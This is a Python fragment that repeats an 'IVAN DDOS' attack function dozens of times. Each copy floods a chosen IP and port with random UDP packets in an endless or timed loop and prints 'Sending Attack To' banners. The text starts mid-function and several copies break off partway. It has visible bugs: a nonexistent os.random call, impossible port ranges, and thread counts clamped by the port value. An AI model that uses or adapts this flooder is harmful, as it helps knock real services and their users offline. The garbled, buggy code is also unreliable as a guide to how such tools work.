    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
